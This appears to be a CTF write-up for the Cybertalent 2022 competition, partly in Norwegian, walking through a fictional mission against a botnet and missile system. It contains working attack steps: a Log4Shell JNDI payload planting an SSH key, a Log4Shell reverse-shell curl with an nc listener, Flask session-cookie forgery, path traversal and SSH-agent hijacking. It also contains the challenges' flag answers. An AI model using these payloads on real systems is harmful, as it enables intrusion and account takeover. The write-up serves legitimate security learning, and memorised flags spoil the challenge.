# Cybertalent-2022

Cybertalent er 


## 2_01 - pcap_fil

Når vi åpner PCAP-filen så er det en HTTP pakke som skiller seg ut:

```text
GET / HTTP/1.1
Host: pwr-07-ws-caf5db
Accept: */*
X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497
User-Agent: ${jndi:ldap://10.0.30.98:1389/Basic/Command/Base64/ZWNobyBzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxaREkxTlRFNUFBQUFJTVRnYnlrZW1wZEFaNEZhaHpMUit0c2NrdFNsaUt0RWR3Wk9sWllXQkhxQyA%2bPiAuc3NoL2F1dGhvcml6ZWRfa2V5cw==}
```

Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte på 2.06.

```text
Kategori: 2. Oppdrag
Oppgave:  2.01_pcap
Svar:     caf5db3e4479b9c3dcb91e43ef9aa497
Poeng:    10

Gratulerer, korrekt svar!
```

## 2.02_anvilnotes



```text
Kategori: 2. Oppdrag
Oppgave:  2.02_anvilnotes
Svar:     4aee8b5ccff539d35e7c8d6a1d749e1b
Poeng:    10

Admin sine notater, som han laget før id ble randomisert...
Gir dette noen hint til hvordan du kan få mer tilgang?
```

## 2.03_anvilnotes_admin

I notatene til admin står følgende:
`☐ Secure flask token using military grade encryptions that can't be unsigned using open software.`

Basert på det, så googlet jeg følgende: `flask token exploit github`.
Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign

Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.

```
pip3 install flask-unsign[wordlist]
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImEifQ.Y7HYAw.1tPvb-GFYM6W4EWgbaJELRAZy7k"
[*] Session decodes to: {'username': 'a'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
[*] Attempted (2560): /-W%/egister your app with Twi
[*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
[*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
[+] Found secret key after 35712 attemptsYRjlMjM1k45F
'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Nå som vi har hemmeligheten som ble brukt for å signere JWT så kan vi signere vår egen hvor vi er admin:

```
flask-unsign --cookie '{"username": "admin"}' --secret "This is an UNSECURE Secret. CHANGE THIS for production environments." --sign
eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
```
Vi kan da bytte ut vår JWT med overnevnte og navigere til https://anvilnotes.cybertalent.no/notes for å motta neste flagg.

```text
Kategori: 2. Oppdrag
Oppgave:  2.03_anvilnotes_admin
Svar:     071f24b786f392f3657fe7bbf5491e80
Poeng:    10

Som admin har du kanskje tilgang til mer funksjonalitet?
```

## 2.04_anvilnotes_password

Som admin har vi nå tilgang til "Save as PDF"-funksjonaliteten.

Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at /genpdf endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
Werkzeug er kjent for å være sårbar for Server Side Template Injection tidligere, men jeg klarte ikke å utnytte dette. Jeg kikket etter Local File Inclusion via `id`-parameteret, og fant ut at `id=../../` avslører et internt API:

```xml
{
    "definitions": {},
    "info": {
        "title": "Cool product name",
        "version": "0.0.0"
    },
    "paths": {
        "/api/decrypt": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            },
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            }
        },
        "/api/encrypt": {
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "body",
                        "name": "data",
                        "required": true,
                        "type": "string"
                    }
                ],
                "produces": [
                    "hex string"
                ],
                "responses": {},
                "summary": "Encrypts data with secret internal key"
            }
        },
        "/api/user/{user}": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "path",
                        "name": "<username>",
                        "required": true,
                        "type": "path"
                    }
                ],
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "Get information from the database on a user. example: /api/user/bob"
            }
        },
        "/api/users": {
            "get": {
                "description": "",
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "List all users from database."
            }
        }
    },
    "swagger": "2.0"
}
```

Jeg brukte da Repeater-funksjonaliteten i Burp for å utforske API'et:
```
>>> id=../users
["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]

>>> id=../user/oper
{"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
```

Passordet ser ikke ut til å passe noe slags hash-format som jeg er bekjent, og hvis man sammenligner den med de andre brukerne så er lengden varierende.
Det vil da hinte til at det er kryptert, ikke hashet.

API'et har dekrypteringsfunksjonalitet, så vi kan benytte det i henhold til beskrivelsen som ble gitt:

```
>>> id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
FLAGG: ed9e224f5a359543420928d1ed1a8ca8
```

Ser ut som om passordet til `oper` er `FLAGG: ed9e224f5a359543420928d1ed1a8ca8`. Det er beleilig.

```text
Kategori: 2. Oppdrag
Oppgave:  2.04_anvilnotes_password
Svar:     ed9e224f5a359543420928d1ed1a8ca8
Poeng:    10

Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.
```

## 2.05_anvilnotes_source

Hvis vi logger på med brukernavn og passord nevnt ovenfor så finner vi to notater:

```
Backup of client source code	
Backup of server source code
```

Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden til C2-klienten/-serveren.
Disse kommer vi tilbake til for 2.09.

```text
Kategori: 2. Oppdrag
Oppgave:  2.05_anvilnotes_source
Svar:     eacad6dfaadb1b0420dc17b6560b89de
Poeng:    10

Dette så interessant ut!
En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kildekoden for skadevaren benyttet i angrepene mot kraftverket deres.
```

## 2.06_pwr-ws-caf5db

En rask nmap skann av subnettet avslører at serveren med Log4J-sårbarheten fortsatt er tilgjengelig:

```bash
>>> nmap -sn 10.0.236.101/27
Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
Host is up (0.0076s latency).
```

https://github.com/zzwlpx/JNDIExploit
https://github.com/black9/Log4shell_JNDIExploit

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.69.36 &
nc -lvnp 4444
curl pwr-ws-caf5db -A '${jndi:ldap://10.0.69.36:1389/Basic/ReverseShell/10.0.69.36/4444}'
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.06_pwr-ws-caf5db
Svar:     74320a680cc9edc8d1f7a9a4a5c613dc
Poeng:    10

Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.

Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.

Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
```

## 2.07_shady-aggregator

When listing the processes using `ps -aux`, we can see an active SSH connection:
`user         428  0.0  0.0   9100  1616 ?        Ss    2022   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_`

```
>>> ls -la /tmp/ssh-njl06sp7u2/agent.203 
srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
```

```
SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator.utl
```


```text
Kategori: 2. Oppdrag
Oppgave:  2.07_shady-aggregator
Svar:     8f1e081e605843164b5efc848c12696a
Poeng:    10

Utmerket! Denne maskinen administrerer et botnett.

Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
```

## 2.08_client_list

On `pwr-ws-caf5db` we could see that there was an active c2 running. Inspecting `/tmp/.tmp/`, we can see some files:

```text
-rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
-rw-r--r-- 1 user user   202 Jan  1 22:43 .config
-rw-r--r-- 1 user user    22 Jan  1 22:43 .output
```

Running `strings /tmp/.tmp/.config` a suspicious looking URL:
`http://shady-aggregator.utl/f52e6101/`

When running a directory scan on the URL we can see that /list is valid.

```
curl http://shady-aggregator.utl/f52e6101/list

ID               | NAME                             | LAST CHECKIN
-----------------+----------------------------------+--------------------
42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.08_client_list
Svar:     260c54fac22eb752739f2978fff9e021
Poeng:    10

En liste over alle de infiserte klientene deres?

Den test-instansen som fortsatt sjekker inn så spennende ut...
```


## 2.09_cloud-hq

Java deserializing on the Config object equals RCE.

```text
Kategori: 2. Oppdrag
Oppgave:  2.09_cloud-hq
Svar:     80e125e2403402c9486c94eb3b276482
Poeng:    10

Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.

Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.

Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
```

## 2.10_infrastruktur



```text
Kategori: 2. Oppdrag
Oppgave:  2.10_infrastruktur
Svar:     c4381f44298bb0dede6c185dc2406a40
Poeng:    10

Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.

Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. Rapporten vil legges i oppdragsmappen din på corax så snart det lar seg gjøre.

Forbered for fremtidige operasjoner og avvent ytterligere ordre.

Ny fil: /home/login/2_oppdrag/INTREP-2.txt
```

## 2.11_aurum_shell

Vi bruker samme exploit som fra 2.09, men bytter ut ID'en til aurum sin.
Flagget ligger godt synlig i `/home/user/FLAG`.

```text
Kategori: 2. Oppdrag
Oppgave:  2.11_aurum_shell
Svar:     4ad7dab1e6231e8903985e5ea70cf4dc
Poeng:    3

Hva brukes denne maskinen til?

Ny fil: /home/login/2_oppdrag/sshkey_aurum
```

## 2.12_missile_targets

```text
Oppgave:  2.12_missile_targets
Svar:     bc23d07612ac5bb9aa1b0a4e612ff275
Poeng:    3

Bra jobba! Dette må være kontrollsystemet til missilene. Målparametrene er allerde lagt inn og sikter på mange vestlige byer!
Dette er viktig informasjon som vi har levert videre til våre oppdragsgivere. Analytikerene våre har plottet målene for deg, sjekk oppdragsmappen.
Som du forstår er det ekstremt viktig å forhindre dette!

Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
```
![Worst case scenario](images/worst_case_scenario.jpg)

## 2.13_findflag


```
Kategori: 2. Oppdrag
Oppgave:  2.13_findflag
Svar:     bc05429e668f76f0cb22b53ca900e447
Poeng:    4

Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
```


## 2.14_multiplier

Koden er basert på:
https://asecuritysite.com/ecdsa/ecd5

```text
Kategori: 2. Oppdrag
Oppgave:  2.14_multiplier
Svar:     114798114433974422739242357806023105894899569106244681546807278823326360043821
Poeng:    5

Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin. Som det kjente ordtaket går -- "Never roll your own crypto". La oss håpe denne nøkkelen kan brukes til noe nyttig :)
```

## 2.15_firmware_staged

```text
Kategori: 2. Oppdrag
Oppgave:  2.15_firmware_staged
Svar:     7f34ada436059e84fea23eb48c91024c9203638b
Poeng:    5

Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.
```

## 2.16-20_submarine_0-4


https://github.com/pbrod/Nvector

```text
Kategori: 2. Oppdrag
Oppgave:  2.16_submarine_0
Svar:     4312ce7fbaea6a5587634a834afcb495
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```

## 2.21_mission_complete

Etter å ha konkatenert flaggene er oppdraget utført! :partying_face:

```text
Kategori: 2. Oppdrag
Oppgave:  2.21_mission_complete
Svar:     4312ce7fbaea6a5587634a834afcb4959330f6fcf99fb2d1acdeb6e005a9477c4662c0ce7ed7d3cbb814cb60746f1d3a88ff4301442793cb1a1b8ef9c390f7a0963fd1126aa1db3a78d2bc402ee9bf91
Poeng:    5

Gratulerer! Du har reddet Europa! ... og fullført oppdraget :) Vi er mektig imponert :D

Ny fil: /home/login/2_oppdrag/mission_complete.jpg
```

![Mission complete!](images/mission_complete.jpg)


## 3.4.13_shady-aggregator_c2

```text
Kategori: 3.4. Utfordringer umulig
Oppgave:  3.4.13_shady-aggregator_c2
Svar:     3fe7dec0658e911f5ce1061f61343067
Poeng:    0

Ikke umulig, men ikke forventet. Uansett veldig godt jobba!

Ny fil: /home/login/2_oppdrag/sshkey_c2@shady-aggregator
```